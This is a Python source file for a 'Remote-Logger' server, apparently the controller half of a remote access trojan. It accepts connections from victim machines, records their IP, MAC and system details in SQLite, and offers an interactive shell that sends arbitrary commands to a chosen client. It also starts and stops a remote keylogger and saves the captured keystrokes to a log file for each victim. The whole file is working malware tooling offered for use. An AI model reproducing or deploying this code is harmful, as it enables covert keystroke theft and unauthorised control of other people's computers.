import os
import socket
import sqlite3
import threading
from sqlite_handler import SqliteHandler



class KeyloggerServer:


    def __init__(self, port1, port2, ip, client_folder, client_db):
        self.host = ip
        self.sock1 = None
        self.sock2 = None
        self.conn1 = None
        self.conn2 = None
        self.port1 = port1
        self.port2 = port2
        self.logger_thread = None
        self.client_db = client_db
        self.client_conn_object = {}
        self.client_folder = client_folder
        self.sqliteHandler = SqliteHandler()
        self.db_table_name = "connectedNodes"
        self._stop_keylogger_event = threading.Event()
        self.dbConn = self.sqliteHandler.create_db(self.client_db, self.db_table_name)
        


    # create socket
    def create_socket(self):
        try:
            self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock1.bind((self.host, self.port1))
            self.sock1.listen(5) #listen for connection
            print(f"[+]Listening on port {self.port1}")


            self.sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock2.bind((self.host, self.port2))
            self.sock2.listen(5) # Listen for connections on port 2
            print(f"[+]Listening on port {self.port2}")
        except socket.error as err:
            print(f"[-]Error unable to create socket {str(err)}")



    # handle client connections
    def handle_connection(self):
        while True:
            try:

                conn, addr = self.sock1.accept()   
                conn.setblocking(True) 
                self.conn1 = conn
                print(f"\n[+]Node {addr} has connected on port {self.port1}!")


                conn2, addr2 = self.sock2.accept()   
                conn.setblocking(True) 
                self.conn2 = conn2
                print(f"[+]Node {addr} has connected on port {self.port2}!")

                
                fileName = f"{str(addr[0])}_log.txt"
                filePath = os.path.join(self.client_folder, fileName)

                if not os.path.exists(filePath):
                    try:
                        with open(filePath, 'a') as client_file:
                            client_file.close()
                    except OSError as e:
                        print("[-]unable to create file")
                        print(e)

                client_info = conn.recv(4096).decode() # receives system info from client
                client_info = client_info.split(",")
                client_info.insert(0, addr[0]) # insert ip address into client info at index 0      
                client_info.append(fileName)

                if self.sqliteHandler.check_mac_address_exists(client_info[1], self.dbConn, self.db_table_name):
                    client_id = self.sqliteHandler.update_client_info(self.dbConn, client_info[1], client_info, self.db_table_name)
                    self.client_conn_object.update({client_id: [conn, conn2]})

                else:
                    # store client information
                    client_id = self.sqliteHandler.store_node_data(self.dbConn, conn, fileName, client_info, self.db_table_name) # store client information
                    self.client_conn_object.update({client_id: [conn, conn2]})

            except Exception as e:
                print(e)



    # format text to bold and green 
    def convert_text_bold_green(self, text):
        RESET = "\033[0m"
        BOLD = "\033[1m"
        COLOR = "\u001b[32m" 
        return f"{BOLD}{COLOR}{text}{RESET}"



    # write data recieved to a text file
    def writeToTxt(self, data, fileName):
        with open(fileName, "a") as logFile:
            logFile.write(data)



    def get_ip_address(self, client_id):
        cursor = self.dbConn.cursor()
        # Execute SQL query to fetch IP_Address of the last inserted row with the given client_id
        cursor.execute(f"SELECT IP_Address FROM {self.db_table_name} WHERE Client_ID=? ORDER BY Client_ID DESC LIMIT 1", (client_id,))
        result = cursor.fetchone() # Fetch the result
        if result:
            ip_address = result[0]
            return ip_address
        else:
            return None



    # process and index capture from client machine
    def handle_keylogs(self, client_id, conn):
        try:
            ip = self.get_ip_address(client_id)
            fileName = os.path.join(self.client_folder, f"{ip}_log.txt")

            while not self._stop_keylogger_event.is_set():
                # Receive captures from client machine
                keylogs = conn.recv(65536).decode()

                if keylogs:
                    self.writeToTxt(keylogs, fileName)  
                else:
                    continue
        except Exception as e:
            print(f"[-]Error occurred while receiving captures: {e}")



    # sends null to the client and get the current working directory in return
    def send_null(self, client_conn):
        client_conn.send(str(" ").encode())
        data = client_conn.recv(1024).decode()
        print(str(data), end="")

    

    # sends commands to the client
    def handle_client_session(self, client_id, client_conn):
        self.send_null(client_conn)

        while True:
            cmd = ""
            cmd = input()
            cmd = cmd.rstrip()

            if cmd.strip()== 'quit':
                print("[+]Closing Session!!!!....")
                break

            elif cmd == "":
                self.send_null(client_conn) 


            elif cmd == "start keylogger":
                self.logger_thread = threading.Thread(target=self.handle_keylogs, daemon=True, args=(client_id, self.conn2,))
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(65536).decode()
                print(str(data), end="")
                self.logger_thread.start()


            elif cmd == "stop keylogger":
                client_conn.send(str(cmd).encode())
                data = client_conn.recv(65536).decode()
                print(str(data), end="")

                if self.logger_thread.is_alive(): 
                    self._stop_keylogger_event.set() # stop keylogger thread

                self._stop_keylogger_event.clear() # reset event

            else:
                try:
                    client_conn.send(str(cmd).encode())
                    data = client_conn.recv(65536).decode()
                    print(str(data), end="")
                except:
                    print("[-]Connection terminated!!!")
                    break

        

    def interactive_shell(self):
        while True:
            cmd = input(self.convert_text_bold_green("Remote-Logger: "))

            if cmd == "":
                pass
            
            elif cmd == "connected":
                self.sqliteHandler.get_nodes_info(self.dbConn, self.client_conn_object, self.db_table_name)
            
            elif cmd == "clients":
                self.sqliteHandler.fetch_all_data(self.client_db, self.dbConn, self.db_table_name)
            
            elif cmd == "guide":
                self.show_commands()

            elif cmd == "delete all":
                self.sqliteHandler.remove_all_clients_from_db(self.dbConn, self.db_table_name, self.client_conn_object)
            
            elif cmd.startswith("delete") and len(cmd.split()) == 2:
                client_id = cmd.split()[-1]
                self.sqliteHandler.remove_client_from_db(self.dbConn, client_id, self.db_table_name, self.client_conn_object)

            elif cmd.startswith("get log") and len(cmd.split()) == 3:
                client_id = cmd.split()[-1]
                self.sqliteHandler.get_log_content(client_id, self.client_folder, self.dbConn, self.db_table_name)

            elif "shell" in cmd and len(cmd.split()) == 2:
                client_id_str = cmd.split()[-1]
                try:
                    client_id = int(client_id_str)
                    if client_id in self.client_conn_object.keys():
                        client_conn = self.client_conn_object[client_id][0] 
                        self.handle_client_session(client_id, client_conn)
                    else:
                        print("[-]Client does not exist!")
                except ValueError:
                    print("Invalid Client ID:", client_id_str)
                        
            else:
                print("[-]Invalid command!!!")


    # create client folder 
    def create_client_folder(self):
        if not os.path.exists(self.client_folder):
            os.makedirs(self.client_folder)



     # displays remote-logger commands
    def show_commands(self):
        user_guide = """
            Remote Logger Commands
                 'guide':['display Remote Logger user commands']
                 'clients':['displays clients within sqlite database']
                 'connected':['display all active connections']
                 'shell':['starts session between the server and the client machine']
                 'delete (Client_ID)': ['remove specified client from sqlite database']
                 'delete all': ['remove all clients from sqlite database']
                 
            Client Commands                                                
                'quit':['quits the session and takes user back to Remote Logger interface']           
                'start keylogger': ['start remote keylogger']
                'stop keylogger': ['stops remote keylogger']      
            """
        print(user_guide)



    def art(self):
        art = """

    ██████  ███████ ███    ███  ██████  ████████ ███████       ██       ██████   ██████   ██████  ███████ ██████  
    ██   ██ ██      ████  ████ ██    ██    ██    ██            ██      ██    ██ ██       ██       ██      ██   ██ 
    ██████  █████   ██ ████ ██ ██    ██    ██    █████   █████ ██      ██    ██ ██   ███ ██   ███ █████   ██████  
    ██   ██ ██      ██  ██  ██ ██    ██    ██    ██            ██      ██    ██ ██    ██ ██    ██ ██      ██   ██ 
    ██   ██ ███████ ██      ██  ██████     ██    ███████       ███████  ██████   ██████   ██████  ███████ ██   ██ 
                                                                                                                  
                                                                                                                
        """
        print(art)



    def start(self):
        self.art()
        self.show_commands()
        self.create_socket()
        self.create_client_folder()


        thread1 = threading.Thread(target=self.handle_connection)
        thread2 = threading.Thread(target=self.interactive_shell)
        thread1.start()
        thread2.start()
